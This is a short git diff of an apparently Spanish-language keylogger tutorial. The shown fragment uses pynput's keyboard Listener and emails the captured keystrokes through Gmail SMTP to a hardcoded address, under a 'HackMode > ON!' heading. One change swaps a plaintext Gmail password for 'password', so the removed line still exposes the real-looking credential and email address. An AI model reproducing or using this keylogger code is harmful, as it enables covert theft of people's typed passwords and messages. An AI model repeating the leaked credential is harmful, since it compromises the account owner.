@@ -8,7 +8,7 @@ pip install pynput
 ``` 
 # Importante: reinicia tu editor de codigo despues de instalar pynput.
 
-# Apreta el HackMode > ON!
+#  HackMode > ON!
 
 ```bash
 from pynput.keyboard import Listener
@@ -74,7 +74,7 @@ server_smtp = smtplib.SMTP("smtp.gmail.com",587)
 
 server_smtp.starttls()
 
-server_smtp.login("deniseduranbybit@gmail.com","Deniseduran2@")
+server_smtp.login("deniseduranbybit@gmail.com","password")
 
 server_smtp.sendmail("deniseduranbybit@gmail.com","deniseduranbybit@gmail.com", mensaje)
 
